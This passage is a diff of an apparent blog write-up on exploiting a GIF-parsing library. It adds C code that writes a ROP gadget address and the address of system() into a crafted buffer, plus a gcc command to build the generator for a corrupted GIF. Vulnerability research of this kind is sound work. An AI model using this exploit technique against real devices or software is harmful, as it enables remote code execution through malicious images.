@@ -250,7 +250,22 @@ Now to find out AAAAAAAA and BBBBBBBB, we need an information disclosure vulnera
 
 ## Putting everything together
 
-Just compile the code that I attached in the Appendix and run the code to generate the corrupted GIF file:
+Just compile the code that I attached in the Appendix. Note that the address of `system()` and the gadget must be replaced by the actual address found by an information disclosure vulnerability (which is not covered in this blog post).
+```
+    /*
+    Gadget g1:
+        ldr x8, [x19, #0x18]
+        add x0, x19, #0x20
+        blr x8
+    */
+    size_t g1_loc = 0x7cb81f0954;  <<-- replace this
+    memcpy(buffer + 128, &g1_loc, 8);
+
+    size_t system_loc = 0x7cb602ce84; <<-- replace this
+    memcpy(buffer + 24, &system_loc, 8);
+```
+
+Run the code to generate the corrupted GIF file:
 ```
 notroot@osboxes:~/Desktop/gif$ gcc -o exploit egif_lib.c exploit.c
 .....
